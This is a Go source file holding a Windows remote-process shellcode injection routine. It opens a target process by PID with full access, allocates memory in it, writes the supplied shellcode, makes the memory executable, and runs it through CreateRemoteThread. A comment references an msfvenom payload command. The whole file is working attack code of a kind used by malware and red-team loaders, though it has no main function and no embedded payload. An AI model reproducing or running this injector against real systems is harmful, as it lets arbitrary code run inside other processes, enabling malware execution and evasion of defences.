package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func shecllodeInection(pid uint32, sc []byte) error {
	PROCESS_ALL_ACCESS := windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	//msfvenom  -f hex -p windows/x64/exec cmd=calc

	fmt.Printf("[+] Getting a handle on process with pid: %d\n", pid)
	pHandle, err := windows.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, pid)
	if err != nil {
		log.Fatalf("[FATAL] Unable to get a handle on process with id: %d : %v ", pid, err)
	}

	fmt.Printf("[+] Obtained a handle 0x%x on process with ID: %d\n", pHandle, pid)

	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modKernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE))

	if addr == 0 {
		return fmt.Errorf("[FATAL] VirtualAlloc Failed: %v\n", lastErr)
	}

	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		return fmt.Errorf("[FATAL] Unable to write shellcode to the the allocated address")
	}
	fmt.Printf("[+] Wrote %d/%d bytes to destination address\n", numberOfBytesWritten, len(sc))

	var oldProtect uint32
	err = windows.VirtualProtectEx(pHandle, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		return fmt.Errorf("[FATAL] VirtualProtect Failed: %v", err)
	}

	procCreateRemoteThread := modKernel32.NewProc("CreateRemoteThread")
	var threadId uint32 = 0
	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if tHandle == 0 {
		return fmt.Errorf("[FATAL] Unable to Create Remote Thread: %v \n", lastErr)
	}

	fmt.Printf("[+] Handle of newly created thread:  0x%x \n[+] Thread ID: %d\n", tHandle, threadId)
	return nil

}
